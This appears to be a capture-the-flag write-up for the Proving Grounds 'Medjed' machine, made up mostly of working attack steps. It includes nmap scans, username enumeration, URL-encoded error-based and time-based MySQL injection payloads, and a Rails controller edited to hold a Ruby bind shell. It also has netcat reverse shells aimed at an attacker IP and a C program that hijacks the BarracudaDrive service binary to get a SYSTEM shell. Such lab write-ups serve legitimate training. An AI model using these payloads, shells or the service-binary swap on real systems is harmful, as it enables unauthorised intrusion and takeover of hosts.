# PG Medjed
## Ruby installation, Error traceback, SQLi, Barracuda
## nmap
```
sudo nmap -Pn -n $IP -sC -sV -p- --open
sudo nmap -Pn -n $IP -sU --top-ports=100 --reason  <-- Add --reason to understand why ports are returned as open, openfiltered, or closed. 

8000/tcp  open  http-alt      BarracudaServer.com (Windows)   <-- Check for exploits.

30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
wget -r ftp://USER:PASS@IP:PORT get files we have Read access to, anually login and explore the files for items that were missed. Store everything in a separate folder.
Use recursive grep to explore the lot of it.
grep -r "pass" , "key", "conn" 
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  <-- FTP Open and listing.
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile   <-- Indicative of a default Ruby install. 
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
```
## 3303 Web App
```
On port 3303, we find a web application with the team profiles
Start your users.txt list. 
There is a password reset feature.
```
## Response Username Enumeration
```
When using username christopher, we get "The password reminder doesn't match the records", which is different from the other users saying "The user does not exist".
we can assume that christopher is a valid user based on the different response.
Tried some SQL injection for password reminder paramter with no luck but worth a shot.
The users page is on the /users path. the users page is on the /users path. By trying http://192.168.237.127:33033/users/christopher, we get an error traceback.
```
## Error Traceback
```
By trying http://192.168.237.127:33033/users/christopher, we get an error traceback.
we know that traceback is shown, we can try to go to an invalid path to see the routes available.
/users takes 4 request methods: GET, PATCH, PUT, DELETE
Tried all four but failed auth.
There is another interesting path /slug
```
## /slug SQLi error and time based 
```
/slug supports a get request
When fuzzing the input, I found that a single quote causes an error.
This showed the source code for the construction of an SQL query:
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"

Whether the query evaluates to True or False, we get the same result, i.e. we don't get any feedback on the output.
However, the MySQL error gets reflected, so this is an error-based injection.
```
## Time Based Boolean Blind
```
SELECT username FROM users WHERE username = '' UNION SELECT IF(1=1, SLEEP(5), null)-- -

URl encoded:
http://192.168.237.127:33033/slug?URL=%27%20UNION%20SELECT%20IF(1=2,%20SLEEP(5),%20null)--%20-
http://192.168.237.127:33033/slug?URL=' UNION SELECT IF(1=2, SLEEP(5), null)-- -

The IF conditional will make the server sleep for 5 seconds if the condition is True, or respond immediately otherwise.
```
## Error Based
```
If we do:
SELECT username FROM users WHERE username = '' AND 1= (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -
The SELECT username FROM users LIMIT 0,1 output gets reflected in the MySQL error.

http://192.168.237.127:33033/slug?URL=%27%20AND%201=%20(SELECT%201%20FROM(SELECT%20COUNT(*),concat(0x3a,(SELECT%20username%20FROM%users%20LIMIT%200,1),FLOOR(rand(0)*2))x%20FROM%20information_schema.TABLES%20GROUP%20BY%20x)a)--%20-
We can see that evren.eagan is the first username.
Replacing the inner query with SELECT reminder FROM USERS LIMIT 0,1, we see the reminder, 4qpdR87QYjRbog.
Go back to the password reset page and successfully reset the password.

Now that we login to a valid user, we gain access to the edit feature.
```
## Web File Server (WFS)
```
There is another HTTPS service running at 44330. We can upload arbitrary files.
```
## users_controller.rb
```
We can then upload a modified version of the users_controller.rb, which handles HTTP requests related to the /user path.
I edited the PATCH/PUT handler to include this bind shell payload: https://github.com/secjohn/ruby-shells/blob/master/shell.rb

Modified users_controller.rb:
class UsersController < ApplicationController
  include BCrypt
  before_action :authorize, only: [:new, :create, :edit, :update, :destroy]
  before_action :set_user, only: [:show, :edit, :update, :destroy]

  # PATCH/PUT /users/1
  # PATCH/PUT /users/1.json
  def update

    require 'socket'
    require 'open3'

    #The number over loop is the port number the shell listens on.
    Socket.tcp_server_loop(5555) do |sock, client_addrinfo|
      begin
      while command = sock.gets
        Open3.popen2e("#{command}") do | stdin, stdout_and_stderr |
          IO.copy_stream(stdout_and_stderr, sock)
          end  
          end
       rescue
      break if command =~ /IQuit!/
      sock.write "Command or file not found.\n"
      sock.write "Type IQuit! to kill the shell forever on the server.\n"
      sock.write "Use ^] or ctl+C (telnet or nc) to exit and keep it open.\n"
      retry
       ensure
         sock.close
      end
    end
end

After uploading the modified users_controller.rb and submitting the "Update User" form, we can then connect to the bind shell.
Get a more stable and interactive shell uploading nc.

Copy netcat over SMB copy
\\192.168.49.237\ROPNOP\nc.exe .

Create another reverse shell: nc -e cmd.exe 192.168.49.237 139
```
## PrivEsc bdctl.exe
```
WinPEAS output, we find an interesting AutoRun executable, bdctl.exe.
This is an executable from the BarracudaDrive program.

Looking in the C:\bd directory, we find a readme.txt which shows the changelog.
It appears that the version of BarracudaDrive is 6.5, since the changelog stops there.
This version is vulnerable to a local privesc vulnerability: https://www.exploit-db.com/exploits/48789
Create addAdmin.c:

#include <windows.h>
#include <winbase.h>

int main(void){
     system("C:\\Sites\\userpro\\nc.exe 192.168.49.237 139 -e cmd.exe");
     WinExec("C:\\bd\\bd.service.exe", 0);
    return 0;
}


On reboot, this will spawn a new reverse shell as SYSTEM.
Cross-compile for Windows: i686-w64-mingw32-gcc addAdmin.c -o bd.exe
Move the existing bd.exe: move bd.exe bd.service.exe
Copy the new malicious bd.exe: copy \\192.168.49.237\ROPNOP\bd.exe .
Now restart the system: shutdown /r. We should be able to catch a shell as SYSTEM.
